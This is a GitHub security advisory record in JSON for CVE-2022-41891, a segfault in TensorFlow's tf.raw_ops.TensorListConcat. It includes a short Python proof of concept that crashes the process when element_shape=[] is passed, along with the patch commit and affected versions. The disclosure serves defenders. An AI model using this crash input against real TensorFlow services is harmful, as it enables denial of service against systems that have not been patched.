{
    "ghsaId": "GHSA-66vq-54fq-6jvv",
    "severity": "MODERATE",
    "summary": "Segfault in `tf.raw_ops.TensorListConcat`",
    "description": "### Impact\nIf [`tf.raw_ops.TensorListConcat`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/list_kernels.h) is given `element_shape=[]`, it results segmentation fault which can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\ntf.raw_ops.TensorListConcat(\n    input_handle=tf.data.experimental.to_variant(tf.data.Dataset.from_tensor_slices([1, 2, 3])),\n    element_dtype=tf.dtypes.float32,\n    element_shape=[]\n)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [fc33f3dc4c14051a83eec6535b608abe1d355fde](https://github.com/tensorflow/tensorflow/commit/fc33f3dc4c14051a83eec6535b608abe1d355fde).\n\nThe fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Tong Liu, ShanghaiTech University\n",
    "permalink": "https://github.com/advisories/GHSA-66vq-54fq-6jvv",
    "publishedAt": "2022-11-21T20:42:18Z",
    "withdrawnAt": null,
    "identifiers": [
        {
            "type": "GHSA",
            "value": "GHSA-66vq-54fq-6jvv"
        },
        {
            "type": "CVE",
            "value": "CVE-2022-41891"
        }
    ]
}